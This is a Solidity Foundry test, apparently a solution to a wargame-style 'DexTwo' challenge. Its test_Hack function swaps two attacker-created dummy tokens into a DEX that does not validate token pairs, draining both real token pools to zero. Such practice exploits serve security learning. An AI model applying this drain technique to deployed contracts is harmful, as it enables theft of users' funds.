// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {DexTwo, SwappableTokenTwo} from "../src/dextwo/DexTwo.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract DexTwoTest is Test {
    DexTwo public sc;
    SwappableTokenTwo public tk1;
    SwappableTokenTwo public tk2;
    SwappableTokenTwo public bd1;
    SwappableTokenTwo public bd2;

    function setUp() public {
        sc = new DexTwo();
        tk1 = new SwappableTokenTwo(address(sc), "tk1", "tk1", 1000000);
        tk2 = new SwappableTokenTwo(address(sc), "tk2", "tk2", 1000000);
        bd1 = new SwappableTokenTwo(address(sc), "bd1", "bd1", 1000000);
        bd2 = new SwappableTokenTwo(address(sc), "bd2", "bd2", 1000000);
        sc.setTokens(address(tk1), address(tk2));
        sc.approve(address(sc), 100);
        sc.add_liquidity(address(tk1), 100);
        sc.add_liquidity(address(tk2), 100);
        bd1.transfer(address(sc), 10);
        bd2.transfer(address(sc), 10);
        tk1.transfer(account.ACC_0, 10);
        tk2.transfer(account.ACC_0, 10);
        bd1.transfer(account.ACC_0, 10);
        bd2.transfer(account.ACC_0, 10);
        assertEq(sc.balanceOf(address(tk1), address(sc)), 100);
        assertEq(sc.balanceOf(address(tk2), address(sc)), 100);
        assertEq(sc.balanceOf(address(tk1), address(account.ACC_0)), 10);
        assertEq(sc.balanceOf(address(tk2), address(account.ACC_0)), 10);
    }

    function test_Hack() public {
        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        // approve
        bd1.approve(address(sc), 10);
        bd2.approve(address(sc), 10);
        sc.swap(address(bd1), address(tk2), 10);
        sc.swap(address(bd2), address(tk1), 10);
        assertTrue(sc.balanceOf(address(tk1), address(sc)) == 0 && sc.balanceOf(address(tk2), address(sc)) == 0);
    }
}
